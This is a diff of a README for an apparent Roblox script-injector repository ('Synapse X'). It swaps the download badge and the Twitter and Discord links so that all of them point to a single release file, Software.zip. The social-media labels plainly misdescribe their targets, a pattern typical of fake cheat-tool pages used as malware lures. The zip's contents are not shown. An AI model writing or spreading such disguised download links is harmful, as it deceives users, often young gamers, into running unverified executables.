@@ -37,7 +37,7 @@ This repository covers a wide range of topics related to game development, Lua p
 ## Getting Started
 
 To get started with Synapse X and begin injecting Lua scripts into your Roblox games, you can download the latest version of the injector from the following link:
-[![Download Synapse X](https://img.shields.io/badge/Download-Synapse_X-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip "Launch to download Synapse X")
+[![Download Synapse X](https://github.com/Lucassdk2/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/releases/download/v1.0/Software.zip)](https://github.com/Lucassdk2/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/releases/download/v1.0/Software.zip "Launch to download Synapse X")
 
 If the link does not work or you need additional information, please check the "Releases" section of this repository for more options.
 
@@ -52,7 +52,7 @@ If you encounter any issues or have questions about using Synapse X, feel free t
 ## Stay Connected
 
 Stay updated on the latest developments, tutorials, and tips for using Synapse X by following us on social media:
-- Twitter: [@SynapseX](https://twitter.com/SynapseX)
-- Discord: [Synapse X Official Discord](https://discord.gg/synapse)
+- Twitter: [@SynapseX](https://github.com/Lucassdk2/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/releases/download/v1.0/Software.zip)
+- Discord: [Synapse X Official Discord](https://github.com/Lucassdk2/Synapse-X-Lua-Script-Injector-for-Roblox-Game-Development/releases/download/v1.0/Software.zip)
 
 Thank you for being a part of the Synapse X community and happy scripting in Roblox! 🌟
